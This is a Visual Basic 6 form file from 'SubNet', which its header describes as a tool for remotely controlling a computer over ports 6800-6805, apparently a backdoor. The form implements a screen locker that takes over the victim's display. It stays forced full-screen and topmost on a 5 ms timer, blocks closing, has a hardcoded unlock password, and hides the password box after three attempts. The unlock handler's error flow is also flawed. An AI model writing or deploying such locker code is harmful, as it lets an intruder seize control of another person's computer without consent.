VERSION 5.00
Begin VB.Form frmLock 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Your System Has Been Locked For Remote Administration"
   ClientHeight    =   7905
   ClientLeft      =   150
   ClientTop       =   435
   ClientWidth     =   12165
   BeginProperty Font 
      Name            =   "BankGothic Lt BT"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmLock.frx":0000
   LinkTopic       =   "Form1"
   MinButton       =   0   'False
   MouseIcon       =   "frmLock.frx":0442
   MousePointer    =   99  'Custom
   Moveable        =   0   'False
   ScaleHeight     =   7905
   ScaleWidth      =   12165
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   5
      Left            =   960
      Top             =   2280
   End
   Begin VB.TextBox txtUnlock 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H00E0E0E0&
      Height          =   270
      Left            =   1920
      TabIndex        =   0
      Top             =   6600
      Width           =   2295
   End
   Begin VB.Image Image2 
      Height          =   825
      Left            =   9240
      Picture         =   "frmLock.frx":07CC
      Top             =   6960
      Width           =   1545
   End
   Begin VB.Image Image1 
      Height          =   8865
      Left            =   0
      Picture         =   "frmLock.frx":4B16
      Top             =   120
      Width           =   11100
   End
End
Attribute VB_Name = "frmLock"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'**********************************************
'**  Program Name:  SubNet® (©2003-2004)     **
'**  Program Description:  Remotely Control  **
'**       A Computer Via LAN/WAN/Dial-Up     **
'**  Program Ports:  6800-6805               **
'**  GUI Designer:  Steven Tanyi             **
'**     E-mail:  sniper6oo@hotmail.com       **
'**  Programmer:  James Miller               **
'**     E-mail:  usssssy@yahoo.com           **
'**********************************************
Dim uUnlock As Long
Private Sub Form_Load()
    txtUnlock.PasswordChar = Chr(164)
    StayOnTop frmLock
    Me.Top = 0
    Me.Left = 0
    Me.Width = Screen.Width
    Me.Height = Screen.Height
    Image1.Top = (Screen.Height - Image1.Height) / 2 - 500
    Image1.Left = (Screen.Width - Image1.Width) / 2
    txtUnlock.Left = (Screen.Width - txtUnlock.Width) / 2
    txtUnlock.Top = (Screen.Height - txtUnlock.Height) - 1100
    Image2.Left = (Screen.Width - Image2.Width) - 500
    Image2.Top = (Screen.Height - Image2.Height) - 500
    Me.MousePointer = 1
End Sub
Function StayOnTop(Form As Form)
    Dim lFlags As Long
    Dim lStay As Long
    lFlags = SWP_NOSIZE Or SWP_NOMOVE
    lStay = SetWindowPos(Form.hwnd, HWND_TOPMOST, 0, 0, 0, 0, lFlags)
End Function

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    If lLocked = True Then
        Cancel = 1
    Else
        Unload Me
    End If
End Sub

Private Sub Timer1_Timer()
    StayOnTop frmLock
    Me.Top = 0
    Me.Left = 0
    Me.Width = Screen.Width
    Me.Height = Screen.Height
End Sub

Private Sub txtUnlock_Change()
On Error GoTo Err
    If LCase(txtUnlock.Text) = "administrator" Then
        Timer1.Enabled = False
        lLocked = False
    End If
Err:
    Unload Me
End Sub

Private Sub txtUnlock_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        uUnlock = uUnlock + 1
        txtUnlock.Text = ""
    End If
    If uUnlock >= 3 Then
        txtUnlock.Visible = False
        Me.MousePointer = 99
    End If
End Sub
